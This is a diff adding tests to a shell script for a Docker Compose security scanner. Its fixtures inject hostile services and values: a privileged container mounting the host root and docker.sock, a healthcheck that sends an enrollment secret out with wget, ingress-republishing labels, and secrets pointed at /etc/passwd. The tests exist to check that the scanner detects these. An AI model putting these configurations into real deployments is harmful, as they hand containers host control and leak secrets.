@@ -363,6 +363,97 @@ expect_scan_failure \
       size: 10G
 "
 
+# --- Default-deny at the SERVICE level ---------------------------------------
+#
+# A key allowlist constrains services that exist; it says nothing about a
+# service that did not exist before. These tamper the service SET.
+
+expect_scan_failure \
+	"detects an appended privileged sidekick service" \
+	"$jf_file" \
+	"\$a\\
+\\
+  vondel-jellyfin-helper:\\
+    image: alpine:latest\\
+    privileged: true\\
+    pid: host\\
+    network_mode: host\\
+    volumes:\\
+      - /:/host\\
+      - /var/run/docker.sock:/var/run/docker.sock\\
+    command: [\"sleep\", \"infinity\"]
+"
+
+# The sharper version of the same finding: this service declares ONLY keys that
+# are on the companion key allowlist (image, volumes), so the key check clears
+# it completely. Only the service-set check can reject it — which is the point
+# of having one.
+expect_scan_failure \
+	"detects a bare sidekick whose keys are all allowlisted" \
+	"$abs_file" \
+	"\$a\\
+\\
+  vondel-audiobookshelf-sidecar:\\
+    image: alpine:latest\\
+    volumes:\\
+      - /var/run/docker.sock:/var/run/docker.sock
+"
+
+# A service hidden behind a Compose profile renders only when that profile is
+# enabled, so it would be invisible to a scan that renders the default set.
+expect_scan_failure \
+	"detects a service hidden behind a compose profile" \
+	"$jf_file" \
+	"\$a\\
+\\
+  vondel-jellyfin-debug:\\
+    image: alpine:latest\\
+    profiles: [debug]\\
+    volumes:\\
+      - /var/run/docker.sock:/var/run/docker.sock
+"
+
+# --- Values behind allowed keys ----------------------------------------------
+
+# healthcheck.test is arbitrary command execution inside the companion — the
+# capability command/entrypoint are denied for. This probe reads the enrollment
+# secret and posts it to a service it shares a network with.
+expect_scan_failure \
+	"detects a healthcheck exfiltrating the enrollment secret" \
+	"$jf_file" \
+	"/$service_anchor/a\\
+    healthcheck:\\
+      test: [\"CMD-SHELL\", \"cat /run/secrets/vondel_compat_enrollment | wget -qO- --post-data=@- http://silo:8080/\"]
+"
+
+# labels are inert only if nothing on the host consumes them; a Traefik router
+# label republishes an internal companion on public ingress.
+expect_scan_failure \
+	"detects ingress-republishing labels" \
+	"$abs_file" \
+	"/$service_anchor/a\\
+    labels:\\
+      traefik.enable: \"true\"\\
+      traefik.http.routers.abs.rule: \"Host(\\\`abs.example\\\`)\"
+"
+
+# File-backed is not the same as the right file: an unpinned secret path mounts
+# an arbitrary host file into the companion at the enrollment path.
+expect_scan_failure \
+	"detects an enrollment secret backed by an arbitrary host file" \
+	"$jf_file" \
+	"s|file: \${VONDEL_JELLYFIN_ENROLLMENT_FILE:-.*}|file: /etc/passwd|"
+
+# The same defeat one level indirect: leave the committed secret alone, add a
+# second host-backed secret and point the companion's source at it.
+expect_scan_failure \
+	"detects a swapped source naming a host-backed secret" \
+	"$abs_file" \
+	"s|source: vondel_audiobookshelf_enrollment|source: vondel_audiobookshelf_alt|;
+	 s|^secrets:\$|secrets:\\
+  vondel_audiobookshelf_alt:\\
+    file: /etc/hosts|"
+
 # --- Summary -----------------------------------------------------------------
 
 printf '%d passed, %d failed\n' "$passed" "$failed"
